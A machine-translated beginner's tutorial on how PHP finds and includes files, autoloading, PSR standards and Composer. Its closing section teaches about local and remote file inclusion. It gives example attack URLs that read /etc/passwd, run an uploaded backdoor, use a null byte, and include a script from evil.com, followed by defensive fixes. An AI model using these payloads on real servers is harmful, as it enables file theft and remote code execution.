<div class="post__text post__text-html js-mediator-article"><div style="text-align:center;"><img src="https://habrastorage.org/getpro/habr/post_images/7f2/13e/83b/7f213e83b178b352cfdda06ff16a639f.png" alt="image"></div><br><br>  In the continuation of the series "PHP for beginners", today's article will be devoted to how PHP searches and connects files. <br><a name="habracut"></a><br><h3>  Why and why </h3><br>  PHP is a scripting language, originally created for the quick sculpt of home pages (yes, yes, it was originally <strong>P</strong> ersonal <strong>H</strong> ome <strong>P</strong> age Tools), and later on it began to create shops, social networks and other crafts on the knee that go beyond the scope , but why am I - and the fact that the more functionality is encoded, the greater the desire to structure it correctly, get rid of code duplication, break into logical pieces and connect only when necessary (this is the same feeling that you had when you read it before  it could be broken up into separate pieces).  For this purpose in PHP there are several functions, the general meaning of which comes down to the connection and interpretation of the specified file.  Let's look at the example of connecting files: <br><br><pre><code class="php hljs"><span class="hljs-comment"><span class="hljs-comment">// file variable.php $a = 0; // file increment.php $a++; // file index.php include ('variable.php'); include ('increment.php'); include ('increment.php'); echo $a;</span></span></code> </pre> <br>  If you run the script <em>index.php</em> , then PHP will all be consistently connected and executed: <br><br><pre> <code class="php hljs">$a = <span class="hljs-number"><span class="hljs-number">0</span></span>; $a++; $a++; <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> $a; <span class="hljs-comment"><span class="hljs-comment">// выведет 2</span></span></code> </pre><br>  When a file is connected, its code is in the same scope as the line in which it was connected, so all variables available in this line will be available in the included file.  If classes or functions were declared in the included file, then they fall into the global scope (unless of course a namespace was specified for them). <br><br>  If you connect a file inside a function, the included files will access the function scope, so the following code will also work: <br><br><pre> <code class="php hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ $a = <span class="hljs-number"><span class="hljs-number">0</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">include</span></span> (<span class="hljs-string"><span class="hljs-string">'increment.php'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">include</span></span> (<span class="hljs-string"><span class="hljs-string">'increment.php'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> $a; } a(); <span class="hljs-comment"><span class="hljs-comment">// выведет 2</span></span></code> </pre><br><blockquote>  Separately, I note the <a href="http://php.net/language.constants.predefined">magic constants</a> : <code>__DIR__</code> , <code>__FILE__</code> , <code>__LINE__</code> and others - they are tied to the context and executed before the inclusion occurs </blockquote>  The peculiarity of connecting files is that when connecting a file, parsing switches to HTML mode, for this reason, any code inside the included file must be enclosed in PHP tags: <br><br><pre> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> <span class="hljs-comment"><span class="hljs-comment">// подключаемый код // ... // </span><span class="hljs-meta"><span class="hljs-comment"><span class="hljs-meta">?&gt;</span></span></span></span></code> </pre><br>  If you have only PHP code in the file, then the closing tag is usually omitted in order not to accidentally forget which thread the characters after the closing tag, which is fraught with problems (I will tell you more about this in the next article). <br><blockquote>  Have you seen the site file for 10,000 lines?  Already tears in the eyes (╥_╥) ... </blockquote><h3>  File connection functions </h3><br>  As mentioned above, in PHP there are several functions for connecting files: <br><br><ul><li>  <a href="http://php.net/function.include">include</a> - includes and executes the specified file; if it does not find it, it issues a warning <code>E_WARNING</code> </li><li>  <a href="http://php.net/function.include-once">include_once</a> - similar to the function above, but includes the file once </li><li>  <a href="http://php.net/function.require">require</a> - includes and executes the specified file; if it does not find it, it produces a fatal error <code>E_ERROR</code> </li><li>  <a href="http://php.net/function.require-once">require_once</a> - similar to the function above, but includes the file once </li></ul><br><blockquote>  In fact, these are not exactly functions, they are special language constructs, and you can use not parentheses.  Among other things, there are other ways to connect and execute files, but this is already digging, let it be for you "task with an asterisk";) </blockquote>  Let's look at the examples of the differences between <code>require</code> and <code>require_once</code> , take one <em>echo.php</em> file: <br><br><pre> <code class="xml hljs"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">p</span></span></span><span class="hljs-tag">&gt;</span></span>text of file echo.php<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">p</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre><br>  And we will connect it several times: <br><br><pre> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> <span class="hljs-comment"><span class="hljs-comment">// подключит и выполнит файл // вернёт 1 require_once 'echo.php'; // файл не будет подключён, т.к. уже подключали // вернёт true require_once 'echo.php'; // подключит и выполнит файл // вернёт 1 require 'echo.php';</span></span></code> </pre><br>  The result of the execution will be two connections of the <em>echo.php</em> file: <br><br><pre> <code class="xml hljs"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">p</span></span></span><span class="hljs-tag">&gt;</span></span>text of file echo.php<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">p</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">p</span></span></span><span class="hljs-tag">&gt;</span></span>text of file echo.php<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">p</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre><br>  There are a couple of directives that affect the connection, but you will not need them - <a href="">auto_prepend_file</a> and <a href="">auto_append_file</a> .  These directives allow you to set files that will be connected before connecting all files and after running all scripts, respectively.  I can't even come up with a “live” script when it may be required. <br><br><div class="spoiler">  <b class="spoiler_title">The task</b> <div class="spoiler_text">  <code>auto_prepend_file</code> and implement a script for using the <code>auto_prepend_file</code> and <code>auto_append_file</code> , you can only change them in <em>php.ini</em> , <em>.htaccess</em> or <em>httpd.conf</em> (see <a href="http://php.net/configuration.changes.modes">PHP_INI_PERDIR</a> ) :) <br></div></div><br><h3>  Where is looking? </h3><br>  PHP searches for include files in directories specified in the <a href="">include_path</a> directive.  This directive also affects the operation of the <code>fopen()</code> , <code>file()</code> , <code>readfile()</code> and <code>file_get_contents()</code> functions.  The algorithm is quite simple - when searching for files, PHP checks each directory in turn from the <code>include_path</code> in turn, until it finds the included file, if it does not, it will return an error.  To change the <code>include_path</code> from the script, use the <a href="http://php.net/function.set-include-path">set_include_path ()</a> function. <br><br>  One important point to consider when setting the <code>include_path</code> is that various characters are used as the path separator in Windows and Linux - ";"  and ":" respectively, so when specifying your directory, use the constant <code>PATH_SEPARATOR</code> , for example: <br><br><pre> <code class="php hljs"><span class="hljs-comment"><span class="hljs-comment">// пример пути в linux $path = '/home/dev/library'; // пример пути в windows $path = 'c:\Users\Dev\Library'; // для linux и windows код изменение include_path идентичный set_include_path(get_include_path() . PATH_SEPARATOR . $path);</span></span></code> </pre><br>  When you write an <code>include_path</code> in the ini file, you can use environment variables like <code>${USER}</code> : <br><br> <code>include_path = ".:${USER}/my-php-library" <br></code> <br><br>  If you attach an absolute path (starting with "/") or relative (starting with "." Or "..") when connecting a file, the <code>include_path</code> directive will be ignored, and the search will be performed only by the specified path. <br><blockquote>  Perhaps it would be worthwhile to tell about <a href="http://php.net/features.safe-mode">safe_mode</a> , but this is a long history (from version 5.4), and I hope you will not encounter it, but if you suddenly, so that you know what it was, but passed ... </blockquote><h3>  Use return </h3><br>  I'll tell you about a small life-hack - if a plug-in file returns something using the <code>return</code> construction, then this data can be obtained and used, so you can easily organize the connection of configuration files, I will give an example for clarity: <br><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">return</span></span> [ <span class="hljs-string"><span class="hljs-string">'host'</span></span> =&gt; <span class="hljs-string"><span class="hljs-string">'localhost'</span></span>, <span class="hljs-string"><span class="hljs-string">'user'</span></span> =&gt; <span class="hljs-string"><span class="hljs-string">'root'</span></span>, <span class="hljs-string"><span class="hljs-string">'pass'</span></span> =&gt; <span class="hljs-string"><span class="hljs-string">''</span></span> ];</code> </pre><br><pre> <code class="php hljs">$dbConfig = <span class="hljs-keyword"><span class="hljs-keyword">require</span></span> <span class="hljs-string"><span class="hljs-string">'config/db.php'</span></span>; var_dump($dbConfig); <span class="hljs-comment"><span class="hljs-comment">/* array( 'host' =&gt; 'localhost', 'user' =&gt; 'root', 'pass' =&gt; '' ) */</span></span></code> </pre><br><blockquote>  Interesting facts, without which life was so good: if functions are defined in the included file, then they can be used in the main file regardless of whether they were declared before return or after </blockquote><div class="spoiler">  <b class="spoiler_title">The task</b> <div class="spoiler_text">  Write code that will collect configuration from multiple folders and files.  The file structure is as follows: <br><br><pre> <code class="plaintext hljs">config |-- default | |-- db.php | |-- debug.php | |-- language.php | `-- template.php |-- development | `-- db.php `-- production |-- db.php `-- language.php</code> </pre><br>  The code should work as follows: <br><br><ul><li>  if in the system environment there is a <code>PROJECT_PHP_SERVER</code> variable and it is equal to <code>development</code> , then all files from the <em>default</em> folder must be connected, the data is entered into the <code>$config</code> variable, then the files from the <em>development</em> folder are connected, and the received data must be erased with the corresponding items saved in <code>$config</code> </li><li>  similar behavior if <code>PROJECT_PHP_SERVER</code> is equal to <code>production</code> (of course, only for the <em>production</em> folder) </li><li>  if there is no variable, or it is set incorrectly, then only files from the <em>default</em> folder are connected. </li></ul><br></div></div><br><h3>  Automatic connection </h3><br>  Constructs with the connection of files look very cumbersome, and also monitor their updating - even that present, check out a piece of code from the example of the <a href="http://anton.shevchuk.name/php/exceptional-code-part-2/">article about exceptions</a> : <br><br><pre> <code class="php hljs"><span class="hljs-comment"><span class="hljs-comment">// load all files w/out autoloader require_once 'Education/Command/AbstractCommand.php'; require_once 'Education/CommandManager.php'; require_once 'Education/Exception/EducationException.php'; require_once 'Education/Exception/CommandManagerException.php'; require_once 'Education/Exception/IllegalCommandException.php'; require_once 'Education/RequestHelper.php'; require_once 'Education/Front.php';</span></span></code> </pre><br>  The first attempt to avoid such “happiness” was the emergence of the <a href="http://php.net/function.autoload">__autoload</a> function.  To say more precisely, it was not even a specific function, you had to define this function yourself, and already with its help it was necessary to include the files we need by the class name.  The only rule was that <strong>for each class a separate file should be created by the class name</strong> (i.e., <i>myClass</i> should be inside the file <i>myClass.php</i> ).  Here is an example of the implementation of such a function <code>__autoload()</code> (taken from the comments to the official manual): <br><br>  Class which we will connect: <br><br><pre> <code class="php hljs"><span class="hljs-comment"><span class="hljs-comment">// класс myClass в отдельном файле myClass.php class myClass { public function __construct() { echo "myClass init'ed successfuly!!!"; } }</span></span></code> </pre><br>  The file that connects this class: <br><br><pre> <code class="php hljs"><span class="hljs-comment"><span class="hljs-comment">// пример реализации // ищем файлы согласно директивы include_path function __autoload($classname) { $filename = $classname .".php"; include_once $filename; } // создаём класс $obj = new myClass();</span></span></code> </pre><br>  Now about the problems with this function - imagine the situation that you are connecting a third-party code, and there someone has already registered the <code>__autoload()</code> function for your code, and voila: <br><br><pre> <code class="php hljs">Fatal error: Cannot redeclare __autoload()</code> </pre><br>  To avoid this, a function was created that allows you to register an arbitrary function or method as a class loader - <a href="http://php.net/function.spl-autoload-register">spl_autoload_register</a> .  Those.  we can create several functions with an arbitrary name to load classes, and register them using <code>spl_autoload_register</code> .  Now <code>index.php</code> will look like this: <br><br><pre> <code class="php hljs"><span class="hljs-comment"><span class="hljs-comment">// пример реализации // ищем файлы согласно директивы include_path function myAutoload($classname) { $filename = $classname .".php"; include_once($filename); } // регистрируем загрузчик spl_autoload_register('myAutoload'); // создаём класс $obj = new myClass();</span></span></code> </pre><br><blockquote>  “Did you know?” Rubric: the first parameter <code>spl_autoload_register()</code> not mandatory, and calling the function without it, the <a href="http://php.net/function.spl-autoload">spl_autoload</a> function will be used as the loader, the search will be carried out in folders from <code>include_path</code> and files with the extension <code>.php</code> and <code>.inc</code> , but this the list can be expanded using the <a href="http://php.net/function.spl-autoload-extensions">spl_autoload_extensions</a> function </blockquote>  Now each developer can register his own loader, the main thing is that the class names do not match, but this should not be a problem if you use namespaces. <br><blockquote>  Since such an advanced functionality as <code>spl_autoload_register()</code> has long existed, the <code>spl_autoload_register()</code> function <code>__autoload()</code> already been declared as <a href="https://wiki.php.net/rfc/deprecations_php_7_1">deprecated in PHP 7.1</a> , which means that this function will be completely removed in the foreseeable future (X_x) </blockquote>  Well, more or less, the picture cleared up, although, wait a minute, all registered loaders queued up as they were registered, respectively, if someone nakhimichil in his loader, instead of the expected result, you can get a very unpleasant bug.  To prevent this from happening, adult smart guys described a standard that allows you to connect third-party libraries without problems, the main thing is that the organization of classes in them complies with the <a href="http://www.php-fig.org/psr/psr-0/">PSR-0</a> standard (10 years old as already) or <a href="http://www.php-fig.org/psr/psr-4/">PSR-4</a> .  What is the essence of the requirements described in the standards: <br><br><ol><li>  Each library must live in its own namespace (the so-called vendor namespace) </li><li>  A separate folder must be created for each namespace. </li><li>  Inside the namespace can be their subspaces - also in separate folders </li><li>  One class - one file </li><li>  The file name with the extension <code>.php</code> must exactly match the class name </li></ol><br>  Example from the manual: <br><table><tbody><tr><th>  Full class name </th><th>  Namespace </th><th>  Base directory </th><th>  Full path </th></tr></tbody><tbody><tr><td>  \ Acme \ Log \ Writer \ File_Writer </td><td>  Acme \ Log \ Writer </td><td>  ./acme-log-writer/lib/ </td><td>  ./acme-log-writer/lib/File_Writer.php </td></tr><tr><td>  \ Aura \ Web \ Response \ Status </td><td>  Aura \ Web </td><td>  / path / to / aura-web / src / </td><td>  /path/to/aura-web/src/Response/Status.php </td></tr><tr><td>  \ Symfony \ Core \ Request </td><td>  Symfony \ core </td><td>  ./vendor/Symfony/Core/ </td><td>  ./vendor/Symfony/Core/Request.php </td></tr><tr><td>  \ Zend \ Acl </td><td>  Zend </td><td>  / usr / includes / Zend / </td><td>  /usr/includes/Zend/Acl.php </td></tr></tbody></table><br><br>  The differences between these two standards are only in the fact that PSR-0 supports the old code without a namespace (i.e., prior to version 5.3.0), and PSR-4 is spared from this anachronism, and even avoids unnecessary nesting of folders. <br><br>  Thanks to these standards, it became possible the emergence of such a tool as <a href="https://getcomposer.org/">composer</a> - the universal package manager for PHP.  If someone missed, then there is a good report from <a href="https://habr.com/ru/users/pronskiy/" class="user_link">pronskiy</a> about this tool. <br><br><iframe width="560" height="315" src="https://www.youtube.com/embed/cpdJR0D8ZV8" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br><h3>  PHP injection </h3><br>  I also wanted to tell about the first mistake of everyone who makes a single entry point for the site in one <code>index.php</code> and calls it the MVC framework: <br><br><pre> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> $page = $_GET[<span class="hljs-string"><span class="hljs-string">'page'</span></span>] ?? <span class="hljs-keyword"><span class="hljs-keyword">die</span></span>(<span class="hljs-string"><span class="hljs-string">'Wrong filename'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!is_file($page)) { <span class="hljs-keyword"><span class="hljs-keyword">die</span></span>(<span class="hljs-string"><span class="hljs-string">'Wrong filename'</span></span>); } <span class="hljs-keyword"><span class="hljs-keyword">include</span></span> $page;</code> </pre><br>  You look at the code, and you want something to send a malicious thread there: <br><br><pre> <code class="bash hljs">// получить неожиданное поведение системы http://domain.com/index.php?page=../index.php // прочитать файлы в директории сервера http://domain.com/index.php?page=config.ini // прочитать системные файлы http://domain.com/index.php?page=/etc/passwd // запустить файлы, которые мы заранее залили на сервер http://domain.com/index.php?page=user/backdoor.php</code> </pre><br>  The first thing that comes to mind is to forcefully add the <code>.php</code> extension, but in some cases this can be bypassed “thanks” to the <a href="http://php.net/security.filesystem.nullbytes">zero byte vulnerability</a> (read, this vulnerability has <a href="https://bugs.php.net/bug.php%3Fid%3D39863">long been fixed</a> , but suddenly you get an interpreter older than PHP 5.3, well, for general development also recommend): <br><br><pre> <code class="bash hljs">// прочитать системные файлы http://domain.com/index.php?page=/etc/passwd%00</code> </pre><br><blockquote>  In modern versions of PHP, the presence of the zero byte character in the path of the included file immediately leads to a corresponding connection error, and even if the specified file exists and can be connected, there will always be an error, this is checked as follows <code>strlen(Z_STRVAL_P(inc_filename)) != Z_STRLEN_P(inc_filename)</code> (this is from the depths of PHP itself) </blockquote>  The second “worthwhile” thought is a check to find the file in the current directory: <br><br><pre> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> $page = $_GET[<span class="hljs-string"><span class="hljs-string">'page'</span></span>] ?? <span class="hljs-keyword"><span class="hljs-keyword">die</span></span>(<span class="hljs-string"><span class="hljs-string">'Wrong filename'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (strpos(realpath($page), <span class="hljs-keyword"><span class="hljs-keyword">__DIR__</span></span>) !== <span class="hljs-number"><span class="hljs-number">0</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">die</span></span>(<span class="hljs-string"><span class="hljs-string">'Wrong path to file'</span></span>); } <span class="hljs-keyword"><span class="hljs-keyword">include</span></span> $page . <span class="hljs-string"><span class="hljs-string">'.php'</span></span>;</code> </pre><br>  The third, but not the last modification of the check, is the use of the <a href="http://php.net/manual/ini.core.php">open_basedir</a> directive, with its help you can specify the directory where PHP will look for the files to connect: <br><br><pre> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> $page = $_GET[<span class="hljs-string"><span class="hljs-string">'page'</span></span>] ?? <span class="hljs-keyword"><span class="hljs-keyword">die</span></span>(<span class="hljs-string"><span class="hljs-string">'Wrong filename'</span></span>); ini_set(<span class="hljs-string"><span class="hljs-string">'open_basedir'</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">__DIR__</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">include</span></span> $page . <span class="hljs-string"><span class="hljs-string">'.php'</span></span>;</code> </pre><br><blockquote>  Be careful, this directive affects not only the connection of files, but also all the work with the file system, i.e.  including this limitation, you must be sure that you have not forgotten anything outside the specified directory, neither the cached data nor any user files (although the functions <code>is_uploaded_file()</code> and <code>move_uploaded_file()</code> continue to work with the temporary folder for the downloaded files). </blockquote>  What other checks are possible?  Lots of options, it all depends on the architecture of your application. <br><br>  I also wanted to recall the existence of the “wonderful” directive <a href="http://php.net/filesystem.configuration">allow_url_include</a> (it has a dependency on <a href="http://php.net/filesystem.configuration">allow_url_fopen</a> ), it allows you to connect and execute remote PHP files, which is much more dangerous for your server: <br><br><pre> <code class="php hljs"><span class="hljs-comment"><span class="hljs-comment">// подключаем удалённый PHP скрипт http://domain.com/index.php?page=http://evil.com/index.php</span></span></code> </pre><br>  They saw, remembered, and never use, the benefit is off by default.  You will need this opportunity a little less than never, in all other cases, lay the correct application architecture, where different parts of the application communicate through the API. <br><br><div class="spoiler">  <b class="spoiler_title">The task</b> <div class="spoiler_text">  Write a script that allows you to connect php-scripts from the current folder by name, with the following to be aware of possible vulnerabilities and prevent slips. <br></div></div><br><h3>  Finally </h3><br>  This article is a basic foundation in PHP, so study carefully, do the tasks and do not filon; no one will teach for you. <br><br><h3>  PS </h3><br>  This is a <a href="http://anton.shevchuk.name/php/php-for-beginners-include-files/">repost</a> from the PHP For Beginners series: <br><br><ul><li>  <a href="https://habr.com/ru/post/437972/">Session</a> </li><li>  <b>File attachment</b> </li></ul><br>  If you have comments on the material of the article, or perhaps on the form, then describe the essence in the comments, and we will make this material even better. </div>